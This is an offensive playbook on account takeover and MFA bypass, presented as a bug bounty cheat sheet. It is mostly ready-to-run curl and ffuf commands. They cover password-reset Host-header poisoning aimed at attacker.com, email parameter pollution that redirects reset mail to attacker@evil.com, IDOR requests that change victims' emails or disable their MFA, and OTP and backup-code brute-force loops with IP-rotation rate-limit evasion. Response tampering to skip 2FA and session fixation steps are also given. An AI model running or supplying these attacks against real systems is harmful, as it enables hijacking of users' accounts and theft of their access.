# DEVIL ATO & MFA ANNIHILATION v777

## ══════════════════════════════════════
## ACCOUNT TAKEOVER MASTER PLAYBOOK
## ══════════════════════════════════════

### ATO Chain 1: Password Reset Poisoning
```bash
# Intercept password reset request, inject Host header
POST /api/password-reset HTTP/1.1
Host: attacker.com          ← injected
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com

# Reset link in email will point to attacker.com
# Victim clicks → attacker gets token

# Test with curl:
curl -X POST "https://target.com/api/password-reset" \
  -H "Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'
```

### ATO Chain 2: Password Reset Token Predictability
```bash
# Analyze reset tokens — check for timestamp/sequential patterns
for i in {1..5}; do
  curl -s -X POST "https://target.com/reset" \
    -d "email=attacker+$i@evil.com" | grep -oE '[a-f0-9]{32,}'
  sleep 1
done
# If tokens share prefix or are time-based → brute with known timestamp
```

### ATO Chain 3: Reset Token Reuse / No Expiry
```bash
# Request reset token for own account
# Use it → check if token is still valid afterward
# Many sites don't invalidate after use
TOKEN="abc123def456"
curl -s "https://target.com/reset?token=$TOKEN&new_password=hacked"
curl -s "https://target.com/reset?token=$TOKEN&new_password=hacked2"  # should fail but may not
```

### ATO Chain 4: Email Parameter Pollution
```bash
# Duplicate email params — server takes last, mail goes to first
POST /reset
email=victim@target.com&email=attacker@evil.com

# Array notation
POST /reset
email[]=victim@target.com&email[]=attacker@evil.com

# Comma separated (some parsers split)
POST /reset
email=victim@target.com,attacker@evil.com

# CC/BCC injection
POST /reset
email=victim@target.com%0aCc:attacker@evil.com
```

### ATO Chain 5: OAuth Account Linking Without Verification
```bash
# 1. Create account with victim@gmail.com using any login method
# 2. Link Google OAuth pointing to attacker's Google account (same email)
# 3. No verification = attacker logs into victim account via Google
```

### ATO Chain 6: IDOR on Account Settings
```bash
# Change email/password of other users via IDOR
curl -X PUT "https://target.com/api/users/1337/email" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"email":"attacker@evil.com"}'

# Try numeric ID traversal, UUID guessing, encoded IDs
# Decode base64 IDs: echo "dXNlcjoxMzM3" | base64 -d → user:1337
```

### ATO Chain 7: Response Manipulation — Skip 2FA
```bash
# If 2FA response is: {"success":false,"next":"verify_otp"}
# Intercept and change to: {"success":true,"next":"dashboard"}
# Or change status code: 403 → 200

# Burp: Proxy → Options → Match and Replace
# Match: "success":false → Replace: "success":true
```

---

## ══════════════════════════════════════
## MFA BYPASS — 25 TECHNIQUES
## ══════════════════════════════════════

### Technique 1: Direct Path Access (No MFA Enforced)
```bash
# After logging in with correct password but before MFA:
# Try accessing protected endpoint directly
curl -s "https://target.com/dashboard" -H "Cookie: SESSION=PRECOMPLETE_SESSION"
```

### Technique 2: OTP Code Reuse
```bash
# OTP codes should be single-use
# Use same OTP twice:
curl -X POST "https://target.com/verify-otp" -d "otp=123456&session=X"
curl -X POST "https://target.com/verify-otp" -d "otp=123456&session=X"  # should fail
```

### Technique 3: OTP Brute Force (No Rate Limit)
```bash
# 6-digit OTP = 1,000,000 combinations
# 4-digit = 10,000
for code in $(seq -w 0 9999); do
  response=$(curl -s -X POST "https://target.com/verify-otp" \
    -d "otp=$code&session=VICTIM_SESSION" -o /dev/null -w "%{http_code}")
  [[ "$response" == "200" ]] && echo "OTP FOUND: $code" && break
done

# Turbo intruder for speed:
# 1000 req/sec async bombardment
```

### Technique 4: Response Manipulation
```bash
# Failed MFA: HTTP 403 with {"verified":false}
# Change response: {"verified":true} → browser proceeds to dashboard
```

### Technique 5: Backup Code Brute Force
```bash
# 8-digit backup codes — brute if no rate limit
ffuf -u "https://target.com/backup-code" \
  -X POST \
  -d "code=FUZZ" \
  -w <(seq -w 00000000 99999999) \
  -mc 200 -t 50
```

### Technique 6: Session Fixation via MFA Flow
```bash
# Complete MFA on attacker account → steal post-MFA session cookie
# Apply cookie to victim account (if session not tied to user)
```

### Technique 7: MFA Not Required on API Endpoints
```bash
# Web UI enforces MFA, but REST API doesn't
curl -X POST "https://api.target.com/v1/login" \
  -d '{"username":"victim","password":"known_password"}'
# Returns session token without MFA prompt
```

### Technique 8: OTP in Response Body / Headers
```bash
# Some devs accidentally include OTP in JSON response or debug header
curl -sv -X POST "https://target.com/send-otp" \
  -d "email=victim@target.com" 2>&1 | grep -i "otp\|code\|token"
```

### Technique 9: Remember Device Bypass
```bash
# Get "remember this device" cookie, replay against victim account
# If tied to user ID not device fingerprint → MFA skip for any user
Cookie: remember_mfa=USER_ID_COOKIE
```

### Technique 10: Account Recovery Flow Skips MFA
```bash
# Use account recovery (backup email/phone) to bypass MFA entirely
# Many apps: recovery flow → directly logged in without MFA
```

### Technique 11: TOTP Window Too Wide
```bash
# TOTP valid for 30s normally
# If server accepts ±5 minutes window → previous codes still valid
# 20 codes to try, trivial to brute
```

### Technique 12: Intercept + Forward MFA Request
```bash
# Attacker races: send own MFA code while changing session cookie to victim's
# Works if server validates OTP against user ID in session (which attacker controls)
```

### Technique 13: null/undefined OTP Accepted
```bash
curl -X POST "https://target.com/verify-otp" -d "otp=null"
curl -X POST "https://target.com/verify-otp" -d "otp="
curl -X POST "https://target.com/verify-otp" -d "otp=undefined"
curl -X POST "https://target.com/verify-otp" -d "otp=0"
curl -X POST "https://target.com/verify-otp"  # no otp param at all
```

### Technique 14: X-Forwarded-For Rate Limit Bypass
```bash
# If rate limit is per-IP, rotate IP via header
for i in $(seq 1 10000); do
  curl -X POST "https://target.com/verify-otp" \
    -H "X-Forwarded-For: 1.2.3.$((i%254))" \
    -d "otp=$(printf '%06d' $i)" &
done
```

### Technique 15: MFA Status IDOR
```bash
# Change another user's MFA enabled status
PATCH /api/users/1337/mfa
{"mfa_enabled": false}
```

---

## ══════════════════════════════════════
## SESSION ATTACKS
## ══════════════════════════════════════

```bash
# Session fixation
# 1. Get pre-auth session: GET /login → Set-Cookie: session=FIXED
# 2. Send link to victim: https://target.com/login?session=FIXED
# 3. Victim logs in → session FIXED is now authenticated
# 4. Attacker uses session=FIXED → logged in as victim

# Session token in URL (referer leakage)
# If auth token appears in URL → check Referer header on any external resource load

# Cookie scope issues — cookie set on .target.com → any subdomain can read
# Find XSS on subdomain → steal main domain session cookie

# Logout doesn't invalidate server-side
# Store old session → logout → replay old session → still works
```

**IMPACT: Critical ATO | Bounty: $5,000–$100,000**
